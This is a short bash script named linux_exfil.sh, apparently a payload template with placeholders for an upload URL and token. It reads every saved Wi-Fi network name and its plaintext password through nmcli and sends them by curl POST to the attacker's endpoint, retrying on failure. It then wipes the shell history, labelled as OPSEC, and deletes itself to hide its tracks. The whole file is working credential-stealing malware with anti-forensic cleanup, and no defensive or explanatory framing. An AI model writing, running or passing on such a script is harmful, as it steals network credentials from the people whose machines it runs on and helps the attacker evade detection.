#!/bin/bash
# linux_exfil.sh
POST_URL="{{POST_URL}}"
TOKEN="{{TOKEN}}"

# Extract Wi-Fi passwords using nmcli
data=""
while IFS= read -r conn; do
  if [ -n "$conn" ]; then
    ssid_psk=$(nmcli -s -g 802-11-wireless.ssid,802-11-wireless-security.psk con show "$conn" 2>/dev/null)
    if [ -n "$ssid_psk" ]; then
      data+="$conn
$ssid_psk
"
    fi
  fi
done < <(nmcli -t -f NAME,TYPE con show 2>/dev/null | awk -F: '$2=="802-11-wireless" {print $1}')

# Exfiltrate if data found (with retry logic)
if [ -n "$data" ]; then
  for i in {1..3}; do
    if echo -e "$data" | curl -X POST \
      -H "X-Token: $TOKEN" \
      --data-binary @- \
      "$POST_URL" \
      -s -o /dev/null --max-time 10; then
      break
    fi
    sleep 2
  done
fi

# Clear command history (OPSEC)
history -c 2>/dev/null
[ -f ~/.bash_history ] && > ~/.bash_history 2>/dev/null

# Self-destruct (delete itself)
rm -- "$0" 2>/dev/null